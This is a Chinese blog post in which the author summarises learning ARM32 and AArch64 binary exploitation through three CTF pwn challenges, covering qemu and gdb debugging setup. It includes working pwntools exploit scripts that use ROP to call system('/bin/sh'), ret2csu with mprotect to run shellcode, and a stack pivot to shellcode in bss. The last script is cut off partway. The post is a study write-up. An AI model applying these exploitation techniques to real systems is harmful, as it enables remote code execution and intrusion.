<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:type" content="website">
<meta property="og:title" content="ZIKH26&#39;s Blog">
<meta property="og:url" content="https://zikh26.github.io/page/5/index.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="CTF PWN IT">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://zikh26.github.io/page/5/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/5/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">ZIKH26's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">万古凡间一过客，九天之上第一仙</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">98</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">100</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/536aee5b.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/536aee5b.html" class="post-title-link" itemprop="url">关于学习arm架构下的pwn的总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：09:20:38" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>通过这段时间对于arm架构的题目学习，自认为收获还是不少的。下面是对于这段时间关于arm架构的pwn题学习所进行的总结。（我其实还想再多做几道arm架构的栈题的，可是网上所找到的实在不多，等再遇到新的arm架构题目，我再添到这篇文章上吧）</p>
<h1 id="运行程序-amp-amp-启动调试"><a href="#运行程序-amp-amp-启动调试" class="headerlink" title="运行程序&amp;&amp;启动调试"></a>运行程序&amp;&amp;启动调试</h1><p>咋装的环境已经忘记了…（装完环境过了一段时间才开始arm架构的学习）装配环境的话，上网搜一下文章也不少。可以参考这篇文章  <a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/116780827#_4">(26条消息) CTF pwn – ARM架构的pwn题详解___lifanxin的博客-CSDN博客</a></p>
<p>记录一下怎么启动以及调试arm架构的程序。</p>
<p>先checksec一下（或者用file命令也行），看看是什么架构的。</p>
<p><img src="/../img/2706180-20220330143502376-463880438.png"></p>
<p><img src="/../img/2706180-20220330143527102-656865950.png"></p>
<p>file命令可以查看程序是动态链接还是静态链接。</p>
<h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><p>如果程序是静态链接并且是32位 arm架构的话，输入qemu-arm .&#x2F;程序名</p>
<p>如果程序是静态链接并且是aarch64架构的话，输入qemu-aarch .&#x2F;程序名</p>
<p>如果程序是动态链接且是32位 arm架构的话，输入qemu-arm -L  &#x2F;usr&#x2F;arm-linux-gnueabihf .&#x2F;程序名</p>
<p>如果程序是动态链接且是aarch64架构的话，输入qemu-aarch64 -L &#x2F;usr&#x2F;aarch64-linux-gnu  .&#x2F;程序名	</p>
<h2 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h2><p><strong>启动调试和运行程序的命令很相似，仅仅是加了一个参数-g 然后后面跟一个端口</strong>。</p>
<p>比如程序是动态链接的32位 arm架构的话，输入qemu-arm -g 1234 -L &#x2F;usr&#x2F;aarch64-linux-gnu .&#x2F;程序名</p>
<p>这个1234是你指定的端口，指定别的端口也可以。然后参照运行程序那四个命令以及上面这个命令，就可以依次类推出调试aarch64架构的命令了。</p>
<p>此时再打开另一个终端，输入gdb-multiarch（<strong>必须是用pwndbg，如果是peda的话，是没法正常调试的</strong>）</p>
<p>然后再输入target remote localhost:1234   连接到刚才开的那个端口。</p>
<p><img src="/../img/2706180-20220330143540210-194090059.png"></p>
<p>进入调试效果如图</p>
<p><img src="/../img/2706180-20220330143550778-303416150.png"></p>
<p>不知道为啥，arm架构进去调试似乎不是从main函数开始的，如果单步的话需要走很久很久，可以进去之后用b在想停留的那个地方下个断点，然后c过去，这样会快很多。</p>
<h2 id="遇见的报错"><a href="#遇见的报错" class="headerlink" title="遇见的报错"></a>遇见的报错</h2><p>1、如果32位遇见这个报错的话：&#x2F;lib&#x2F;ld-linux-armhf.so.3: No such file or directory    </p>
<p>输入命令sudo apt-get install libc6-armhf-cross</p>
<p>2、如果遇见这个报错的话：Invalid ELF image for this architecture</p>
<p>就说明你的qemu后面跟的参数不对，就比如你这个程序是aarch64架构的，但是你qemu后面跟的是-arm。如果你这个程序是aarch64架构的，正确做法应该是qemu后面跟着-aarch64	</p>
<p>然后关于arm架构下的指令，在网上能搜到很多，也解释的比较清楚，我就不在这里赘述了。</p>
<p>下面三道例题（其实我是想多写几道的，但是在网上找到可下载的题目只有这三道（还有个堆题，等学堆了再做））的下载链接：</p>
<p>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dRbm8k5qup7Anj9UDrsBlA?pwd=ecpr">https://pan.baidu.com/s/1dRbm8k5qup7Anj9UDrsBlA?pwd=ecpr</a> 提取码: ecpr </p>
<h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的收获与学习有：</p>
<p>1、这是做的第一道arm架构的题目，考察的就是最简单的rop，学习到了arm32的寄存器传参方式，以及最简单的rop利用。</p>
<p>2、在面对静态链接的程序，IDA打开之后会发现里面有几百个函数，而且也搜不到main函数，在这种情况下，可以利用搜<strong>索关键字符串，通过关键字符串去找主函数</strong>。</p>
<p>3、不知道是不是我的错觉，在考察简单的rop情况下，似乎师傅们都没有去花很多的精力去查看ida生成的伪代码（确实伪代码太多了），直接gdb打开看完偏移就是干。</p>
<p>4、在面对静态链接的程序，从ida中分析可能会异常的麻烦，如果有可能的话，其实可以靠输入内容之后观察程序的回显，猜测一些程序功能。</p>
<h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h2><p><img src="/../img/2706180-20220330143602189-496528067.png"></p>
<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>打开IDA之后，可以发现是静态链接，旁边有非常多的函数，难以迅速定位到主函数。因此采用一种比较好用的方法。</p>
<p>先运行一下这个程序，发现有这种字符串</p>
<p><img src="/../img/2706180-20220330143615732-1043244594.png"></p>
<p>那就在IDA里面用shift+F12，查看一下这个字符串。</p>
<p><img src="/../img/2706180-20220330143624039-802565433.png"></p>
<p>然后看一下引用，如此就可以找到主函数了</p>
<p><img src="/../img/2706180-20220330143632149-590724454.png"></p>
<p>跳到汇编代码处，F5一下，即可看到主函数的伪代码（直接搜main函数的话，也是搜不到的）</p>
<p><img src="/../img/2706180-20220330143641480-1941741546.png"></p>
<p>直接看伪代码有点懵，先输入一些垃圾数据（第一次必须要输入一个回车），看看是否存在溢出</p>
<p><img src="/../img/2706180-20220330143649674-663002508.png"></p>
<p>发现段错误了，那就说明存在溢出。然后用gdb调试一下，看看溢出是多少。</p>
<p>最初我企图用gdb单步到输入函数，然后输入垃圾数据，不过单步了很久发现依旧没有到可输入的地方，通过去看其他师傅的博客，发现了一个方便的方法。<strong>我们启动gdb之后直接输入c。c的本意是去continue到下一个断点，可是我们压根就没有下断点，因此能让这个continue停下的办法就是碰到输入函数</strong>（这一招确实妙啊）。</p>
<p><img src="/../img/2706180-20220330143659812-841662687.png"></p>
<p>我们第一次先输入一个回车</p>
<h3 id="插入一点：如果不输入回车呢？"><a href="#插入一点：如果不输入回车呢？" class="headerlink" title="插入一点：如果不输入回车呢？"></a>插入一点：如果不输入回车呢？</h3><p>不输入回车，去输入别的内容的话，程序会将我们输入的内容丢弃第一个字符，从而把后面的内容去当做命令处理。<br><img src="/../img/2706180-20220330143706504-722501017.png"></p>
<p>可以发现第一次输入了个kkkkkkkkk，结果报了一个command not found。那就说明这个程序试图将我们输入的内容当做命令执行。</p>
<p><img src="/../img/2706180-20220330143715763-1494112878.png"></p>
<p>可是我们输入ls的话，它说s这个命令没有被执行，由此猜测，第一个字符被丢弃了。</p>
<p><img src="/../img/2706180-20220330143723931-1908764069.png"></p>
<p>结合上图发现，事实确实如此，可是这样就发现我们输入的内容当做指令执行的话，程序就结束了，因此我们尝试只输入一个回车看看会怎么样？</p>
<p><img src="/../img/2706180-20220330143730693-1862644172.png"></p>
<p>程序开始继续运行了。而且值得一提的是，人家英语也说了，按下回车键就会开始。</p>
<p>继续回归正题</p>
<p>怎么去确定偏移量？我们采用cyclic去确定输入点距离返回地址的偏移。</p>
<p><img src="/../img/2706180-20220330143740365-728718642.png"></p>
<p>用cyclic填充两百个字符，然后用cyclic -l得到偏移。</p>
<p><img src="/../img/2706180-20220330143748777-307977432.png"></p>
<p>因为这是静态链接，因此我们可以很轻松的去里面拿到我们想要的&#x2F;bin&#x2F;sh参数和system函数。</p>
<p>事实上我们没有办法搜到system函数，但是猜测一下，system会调用&#x2F;bin&#x2F;sh，因此我们先去找一下&#x2F;bin&#x2F;sh</p>
<p><img src="/../img/2706180-20220330143816463-469510505.png"><br><img src="/../img/2706180-20220330143825159-977323706.png"></p>
<p><strong>如果你的IDA没有出现上面红框里面的内容，就说明IDA还没有把所有的数据装载完，等一会就行了。</strong></p>
<p>然后点上面红色框跳转过来，就是这个函数。</p>
<p><img src="/../img/2706180-20220330143834126-1105741162.png"></p>
<p>虽然我看不出来他是个system函数，但是有关系嘛？没有关系。如此，system函数的地址就是 0x10ba8</p>
<p><img src="/../img/2706180-20220330143844765-114030552.png"></p>
<h2 id="arm架构的基本知识"><a href="#arm架构的基本知识" class="headerlink" title="arm架构的基本知识"></a>arm架构的基本知识</h2><h3 id="arm32位"><a href="#arm32位" class="headerlink" title="arm32位"></a>arm32位</h3><p>这个arm32位的话，<strong>传前四个参数是用的r0~r3寄存器</strong>，如果<strong>参数再多的话，就利用栈传参</strong>（从右向左依次入栈）。<strong>函数的返回值会存在r0寄存器</strong>中。然后<strong>pc寄存器就相当于x86中的eip寄存器</strong>（始终装的都是我们下一条指令执行的地址）除此之外，<strong>arm 的 b&#x2F;bl 等指令实现跳转</strong>。</p>
<p>因此我们就先去看看有什么可以控制r0寄存器的gadget。</p>
<p><img src="/../img/2706180-20220330143857152-1288308186.png"></p>
<p>这个pop r0 r4 pc就很nice。</p>
<p>r4我们随便填充，pc你可以理解为ret的效果。然后payload格式跟x86的差不多。</p>
<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./typo&#x27;</span>)</span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">pop_r0_r4_pc_addr=<span class="number">0x00020904</span></span><br><span class="line">bin_sh_addr=<span class="number">0x0006c384</span></span><br><span class="line">sys_addr=<span class="number">0x00010BA8</span></span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(pop_r0_r4_pc_addr)+p32(bin_sh_addr)+p32(<span class="number">0</span>)+p32(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()                 </span><br></pre></td></tr></table></figure>

<h1 id="Shanghai2018-–-baby-arm"><a href="#Shanghai2018-–-baby-arm" class="headerlink" title="Shanghai2018 – baby_arm"></a>Shanghai2018 – baby_arm</h1><h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习与收获有：</p>
<p>1、这道题也算是学习了arrch64架构下的ret2csu，与x86中的区别其实并不大。</p>
<p>2、mprotect函数去修改内存属性，从而执行shellcode</p>
<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220330143907318-655446132.png"></p>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="/../img/2706180-20220330143915394-2016812350.png"></p>
<p>程序逻辑很简单，read一次输入，输入到bss段，没法溢出。然后sub_4007F0函数也有一次输入，输入到栈里，存在溢出。</p>
<p><img src="/../img/2706180-20220330143923115-1537780362.png"></p>
<p>同时程序中存在一个mprotect函数。</p>
<h2 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h2><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><p>这道题发现在第二个read结束后，我们的数据并不能覆盖返回地址（此时返回地址在我们输入数据的上面）（如下图）</p>
<p><img src="/../img/2706180-20220330143934847-349157649.png"></p>
<p>不过我们发现在0x400860的地方还有一个ret，我们单步到这个ret看看，此时的x30是什么。</p>
<p><img src="/../img/2706180-20220330143941968-684243399.png"></p>
<p>可以发现此时的x30，就是距离栈顶为2的内容，而这个内容对应的栈地址0x40007fffb8则是在我们第二次read输入的起始地址下面，也就是说我们可以控制这个地址，从而来劫持程序的执行流。</p>
<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu?"></a>ret2csu?</h3><p>由于mprotect函数可以改变内存的属性，本来这道题是bss段是只能写的，不过我们可以用mprotect将bss段变成可执行，然后往里面输入个shellcode就ok了。怎么控制mprotect的参数？</p>
<p>我们发现，arm架构下，也有一段汇编可以控制寄存器参数（完全可以把这段当成x86中的csu）</p>
<p><img src="/../img/2706180-20220330143950123-1357024283.png"></p>
<p>先分析下面的loc_4008cc的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">LDP             X29, X30, [SP+var_s0],#0x40                </span><br><span class="line">RET</span><br></pre></td></tr></table></figure>

<p>第一句这个LDP         X19, X20, [SP,#var_s10]就是说将SP+0x10所指向的内容给x19和x20寄存器（x19寄存器拿的是SP+0x10所指向的内容，而x20寄存器拿的是SP+0x18所指向的内容）</p>
<p>然后第四句这个LDP         X29, X30, [SP+var_s0],#0x40的意思是将SP所指向的内容给x29和x30寄存器（x29寄存器拿的是SP所指向的内容，而x30寄存器拿的是SP+0x8所指向的内容），完成这句指令之后，再将SP指针增加0x40个字节。</p>
<p>然后ret，这个就是返回到x30寄存器所存储的值。</p>
<p>再结合着刚刚分析的内容，来看一下loc_4008ac的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">MOV             X2, X22</span><br><span class="line">MOV             X1, X23</span><br><span class="line">MOV             W0, W24</span><br><span class="line">ADD             X19, X19, #1</span><br><span class="line">BLR             X3</span><br><span class="line">CMP             X19, X20</span><br><span class="line">B.NE            loc_4008AC</span><br></pre></td></tr></table></figure>

<p>第一句就是说将x19的值逻辑左移3位，然后加上x21的值，将得到的这个值所指向内容给x3寄存器。（如果我们控制x19的值为0的话，就是说把x21寄存器的值所指向的内容给x3寄存器。</p>
<p>然后剩下的mov，add就没什么好说的了。</p>
<p>倒数第三行BLR指令是去跳转到X3寄存器的值，同时把下一个指令的地址存到x30里面。</p>
<p>然后下面的CMP和x86里面的一样了。</p>
<p>如此思路就出来了，几乎是跟ret2csu的利用方法一样。有两点需要注意一下。第一点就是loc_4008cc中的</p>
<p>LDP             X29, X30, [SP+var_s0],#0x40    这个指令，虽然<strong>它是在这个loc_4008cc函数的最后，但是它传给x29和x30寄存器的时候，拿的是栈顶的值。因此布置栈中数据的时候，栈顶的内容应该是存放的x29和x30的值。</strong></p>
<p>第二点，<strong>是BLR X3的时候，这个X3的值溯源一下，它是由X21充当指针来指向的，而X21的值又是SP+0x20充当指针来指向的。意思就是说，我们最终想跳转的内容必须被指针的指针所指向，因此考虑的是将X3的内容放在bss段，然后X21去存储bss段的地址（指向X3的内容），然后再把X21的值布置在栈里面</strong>。最后X3的值放入mprotect的plt地址即可（<strong>因为BLR跳的话，直接跳到了寄存器的值处，因此这里应该放的是plt地址（要求这个地址装的就是指令）</strong>，got地址（装的是got表，而got表中装的才是指令）是用于指针寻址跳转的情况，当时在这里迷了一下）。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26705</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./zhengchang&#x27;</span>)</span><br><span class="line">mprotect_got=e.got[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">mprotect_plt=e.plt[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x48</span></span><br><span class="line">bss_addr=<span class="number">0x411068</span></span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line">shellcode=asm(shellcraft.aarch64.sh())</span><br><span class="line">shellcode=shellcode.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode+=p64(mprotect_plt)</span><br><span class="line">payload1=shellcode</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name:&#x27;</span>,payload1)</span><br><span class="line">payload2=offset*<span class="string">&#x27;a&#x27;</span>+p64(csu1)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(csu2) <span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(bss_addr+<span class="number">0x100</span>)+p64(<span class="number">7</span>)<span class="comment">#x21 x22  分别赋值给了x3 x2</span></span><br><span class="line">payload2+=p64(<span class="number">0x1000</span>)+p64(<span class="number">0x411000</span>)<span class="comment">#x23 x24  分别赋值给了x1 w0</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(bss_addr)<span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x21 x22</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x23 x24</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><p>通过这道题的学习与收获有：</p>
<p>1、arm架构（32位）的bss段是可执行的！</p>
<p>2、这道题考察的是栈迁移，以及通过调试来确定payload的布局。这道题是比较锻炼调试能力的（至少对于现在的我来说），锻炼调试能力，我指的是不看exp的情况下，自己做这道题…</p>
<p>3、现在也做了三道arm架构的题了，说实话和x86下的区别不大。只要熟悉x86的做题思路，做这种题，应该很快就能适应。</p>
<h2 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220330144006717-745739803.png"></p>
<h2 id="程序分析：-1"><a href="#程序分析：-1" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="/../img/2706180-20220330144021409-2027396437.png"></p>
<p>存在溢出点，但是可溢出的字节很少，因此考虑栈迁移。且没有后门函数</p>
<p><strong>这道题我有的地方写的是R11（是因为IDA上看是R11），有的地方写的fp（因为gdb里看的是fp)，实际上这俩就是一个东西。</strong></p>
<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>栈迁移的话，考虑迁移到BSS段，同时观察汇编，发现read的第二个参数（即输入的地址）是由R3传递的，而R3的值是由R11来传递的</p>
<p><img src="/../img/2706180-20220330144030365-98591889.png"></p>
<p>同时在最后，又有一个pop指令来控制R11和PC，因此我们是可以控制R11（也就是read的第二个参数)和程序执行流的（PC）</p>
<p><img src="/../img/2706180-20220330144038604-1618653163.png"></p>
<p>经过调试发现，这个fp距离我们输入起始的地址偏移为100,这就意味着我们需要填充100个垃圾数据，然后来控制fp以及pc。</p>
<p>因此第一次输入的时候，控制fp，让其为bss段地址（迁移的时候bss段尽量抬高），然后将返回地址read地址，再跑一次，让我们的第二次payload输入到bss段。</p>
<p><strong>arm架构（32位）的bss段是可执行的，尽管用vmmap看的是可写不可执行（但是布置进去的shellcode确实可以执行）</strong></p>
<p>因此我们就要把shellcode布置在bss段。这道题是十分锻炼自主的调试能力的，可以看见我的exp是在shellcode前面布置了两个内容，这里我并不想解释原因。最开始我自己做这道题的时候并没有写这两个内容，当时我认为直接把bss段写shellcode就行，然后控制PC指针执行过去，<strong>事实上这样做是错误的</strong>。原因请自主调试，这里考察了自主调试来布局payload（如果你可以眼睛看出来payload整体布局的话，当我什么都没说），如果连这里到最后都不理解而且还稀里糊涂的交了flag的话，那做这道题是毫无意义的。</p>
<p>大致思路就是这样（第二次输入布置shellcode，然后控制PC寄存器，将其指向shellcode的位置）剩下的具体细节真的没有办法记录，因为剩下的布局都是一点一点调试出来的。</p>
<h2 id="关于对调试能力的总结："><a href="#关于对调试能力的总结：" class="headerlink" title="关于对调试能力的总结："></a>关于对调试能力的总结：</h2><p>我这里说一下我从刚开始学pwn，到现在也刚好是四个月了。总结了一下的调试经验（有可能在各位师傅面前算是班门弄斧了，但这依然是对这四个月所掌握的调试能力的一个记录）。</p>
<p>第一，你要时刻清楚你自己想要看的内容以及自己卡在了哪里</p>
<p>第二，在调试的过程中，遇到卡住的地方，要思考为什么会这样。</p>
<p>第三，在锻炼调试能力的时候，刚开始有的地方可能不知道卡住的原因是什么，建议找一份可以打通（和你思路相近的）的exp，去调试一下，再反复对比自己exp的动态调试，这样很容易找到问题。</p>
<p>第四，就是可能你认为你的思路很对，但就是打不通，而别人的思路都和你的不一样，<strong>由衷建议，不要放弃你的思路，到最后无非是两种可能，你通过坚持以及思考打通了自己的exp，又或者是你通过反复调试，最后发现自己的思路是错误的，不可行的。但其实不论结果，这个坚持的过程已经让你的调试能力有了不小的进步。</strong></p>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26705)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;./armup_buu&quot;])</span></span><br><span class="line">p=process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./armup_buu&quot;</span>])</span><br><span class="line">e=ELF(<span class="string">&#x27;./armup_buu&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x21000</span>+<span class="number">0x600</span></span><br><span class="line">read_addr=<span class="number">0x0001052C</span></span><br><span class="line">offset=<span class="number">100</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(bss_addr+<span class="number">0x68</span>)+p32(read_addr)<span class="comment">#因为sub减去了0x68，所以这里提前加上0x68</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">shellcode=p32(<span class="number">0</span>)+p32(bss_addr+<span class="number">8</span>)+asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">payload=payload.ljust(<span class="number">0x64</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)+p32(<span class="number">0x10548</span>)<span class="comment">#bss_addr+4是将sp设置成bss_addr（不过这一步只是将参数给R11，将sp赋值是下面的操作）    将pc设置为0x10548的目的是再执行一遍 SUB     SP, R11     POP     &#123;R11,PC&#125;</span></span><br><span class="line"><span 